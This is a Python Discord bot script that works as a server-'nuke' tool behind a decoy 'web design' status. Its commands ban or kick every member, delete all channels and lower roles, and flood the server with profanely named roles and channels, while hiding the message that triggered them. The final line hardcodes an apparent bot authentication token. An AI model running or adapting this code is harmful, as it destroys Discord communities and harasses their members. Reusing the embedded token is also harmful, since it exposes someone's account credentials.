import discord
from discord.ext import commands
 
client = commands.Bot(command_prefix = '.')
 
@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.dnd, activity=discord.Game('web design'))
    print(f'\nLogged in as {client.user.name}#{client.user.discriminator}, User ID: {client.user.id}, Version: {discord.__version__}\n')
 
@client.command()
async def banAll(ctx):
    await ctx.message.delete()
    await ctx.send('enjoy!')
    print('nothing.')
    for member in ctx.guild.members:
        try:
            await member.ban()
        except:
            continue
 
@client.command()
async def kickAll(ctx):
    await ctx.message.delete()
    await ctx.send('enjoy!')
    print('have a nice day.')
    for member in ctx.guild.members:
        try:
            await member.kick()
        except:
            continue
 
@client.command()
async def role(ctx, choice):
    if choice == 'create':
        print('nothing.')
        for i in range(1, 11):
            await ctx.guild.create_role(name=f'fucking server {i}')
    elif choice == 'delete':
        print('nothing...')
        roles = ctx.guild.roles
        roles.pop(0)
        for role in roles:
            if ctx.guild.me.roles[-1] > role:
                await role.delete()
            else:
                break
    else:
        await ctx.send('not valid option')
 
@client.command()
async def channel(ctx, choice):
    if choice == 'create':
        print('nothing..')
        for i in range(1, 11):
            await ctx.guild.create_text_channel(f'fuck you{i}')
            await ctx.guild.create_voice_channel(f'fuck you{i}')
    elif choice == 'delete':
        print('Dnothing..')
        for channel in ctx.guild.channels:
            await channel.delete()
    else:
        await ctx.send('not valid option')
 
@client.command()
async def logout(ctx):
    if ctx.author.id == myID: #replace myID with your Discord user ID
        await client.logout()
    else:
        await ctx.send('you cant do that')
 
client.run('Njg5NzEyNTk2MzE1NTM3NDcy.XnG3DA.iDIDWQ6fbEqBGBEXUbaKkPaCVlw')
